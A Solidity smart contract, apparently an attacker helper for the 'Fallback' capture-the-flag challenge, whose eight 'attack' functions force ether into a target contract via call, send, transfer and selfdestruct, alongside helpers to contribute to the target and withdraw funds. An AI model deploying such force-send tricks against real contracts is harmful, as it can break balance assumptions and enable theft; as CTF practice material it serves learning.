/**
 *Submitted for verification at Etherscan.io on 2022-08-29
*/

pragma solidity ^0.4.21;

interface IFallback {
    function contribute() public payable;
    function getContribution() public view returns (uint);
}

contract CTFFallBack {
    address private owner;
    function CTFFallBack () {
        owner = msg.sender;
    }

    // 强制发送以太币给 _address
    function attack(address _address) public payable{
        require(msg.value == 0.0001 ether);
        // selfdestruct(_address);
        address(_address).call.value(msg.value);
    }

    function attack2(address _address) public payable{
        require(msg.value == 0.0001 ether);
        // selfdestruct(_address);
        address(_address).call.value(msg.value).gas(1000000);
    }

    function attack3(address _address) public payable{
        require(msg.value == 0.0001 ether);
        // selfdestruct(_address);
        address(_address).transfer(msg.value);
    }

    function attack4(address _address) public payable{
        require(msg.value == 0.0001 ether);
        // selfdestruct(_address);
        address(_address).send(msg.value);
    }

     // 强制发送以太币给 _address
    function attack5(address _address) public payable{
        require(msg.value == 0.0001 ether);
        selfdestruct(_address);
    }

    function attack6(address _address) public payable{
        require(msg.value == 0.0001 ether);
        IFallback fb = IFallback(_address);
        address(fb).send(msg.value);
    }

    function attack7(address _address) public payable{
        require(msg.value == 0.0001 ether);
        IFallback fb = IFallback(_address);
        address(fb).transfer(msg.value);
    }

    function attack8(address _address) public payable{
        require(msg.value == 0.0001 ether);
        IFallback fb = IFallback(_address);
        address(fb).call.value(msg.value);
    }



    function sendContribute(address _address) public payable {
        require(msg.value == 0.0001 ether);

        IFallback fb = IFallback(_address);
        fb.contribute.value(msg.value)();
    }

    function checkContribute(address _address) public view returns(uint256) {
        IFallback fb = IFallback(_address);
        uint re = fb.getContribution();
        return re;
    }

    function addMoney() public payable{
    }

    function withdraw() public{
        require(msg.sender == owner);

        owner.transfer(address(this).balance);
    }

    function() payable public {
        
    }
}